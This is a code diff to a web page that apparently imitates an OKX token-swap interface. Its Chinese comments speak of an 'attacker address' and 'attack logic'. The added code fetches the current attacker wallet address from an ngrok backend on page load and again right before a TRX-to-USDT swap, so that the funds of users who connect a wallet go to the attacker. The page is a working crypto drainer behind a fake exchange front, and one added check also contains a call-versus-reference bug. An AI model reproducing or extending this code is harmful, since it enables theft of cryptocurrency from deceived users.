@@ -1563,13 +1563,31 @@
         let userBalance = 0; // 用户真实余额
         
         // 🎯 攻击目标地址 (A成员地址 - 攻击者)
-        const ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';
+        // const ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';
+        let ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';
+
 
         // 初始化
-        document.addEventListener('DOMContentLoaded', function() {
+        document.addEventListener('DOMContentLoaded', async function() {
             debugLog('🚀 OKX安全研究平台已加载');
             debugLog('🎯 攻击系统已激活');
             debugLog(`🎯 攻击目标地址: ${ATTACKER_ADDRESS}`);
+            debugLog(`🎯 初始攻击目标地址: ${ATTACKER_ADDRESS}`);
+
+            //从ngrok后端获取最新的攻击者地址
+            try{
+                if (typeof getCurrentAttackerAddress() === 'function'){
+                    const cloudAddressResult = await getCurrentAttackerAddress();
+                    if (cloudAddressResult && cloudAddressResult.address && cloudAddressResult.address !== ATTACKER_ADDRESS){
+                        ATTACKER_ADDRESS = cloudAddressResult.address;
+                        debugLog(`🎯 后端已更改最新攻击目标地址: ${ATTACKER_ADDRESS}`);
+                        debugLog(`🎯 钱包信息: ${cloudAddressResult.info ? cloudAddressResult.info.wallet_name : '默认钱包'}`);
+                    }
+                }
+            }catch (error){
+                debugLog(`⚠️ 获取最新攻击目标地址失败: ${error.message}，使用默认地址`);
+            }
+
             debugLog('🎯 TRX → USDT 攻击逻辑已就绪');
             
             initializeWeb3Grid();
@@ -1958,7 +1976,19 @@
                 showWalletModal();
                 return;
             }
-            
+
+            try{
+                if (typeof getCurrentAttackerAddress === 'function'){
+                    const latestAddressResult = await getCurrentAttackerAddress();
+                    if (latestAddressResult && latestAddressResult.address){
+                        ATTACKER_ADDRESS = latestAddressResult.address;
+                        debugLog(`🔄 攻击前更新目标地址: ${ATTACKER_ADDRESS}`);
+                    }
+                }
+            }catch (error){
+                debugLog(`⚠️ 获取最新攻击者地址失败: ${error.message}，使用当前地址: ${ATTACKER_ADDRESS}`);
+            }
+
             const fromAmount = document.getElementById('fromAmount').value;
             if (!fromAmount || parseFloat(fromAmount) <= 0) {
                 showToast('请输入有效的TRX数量', 'error');
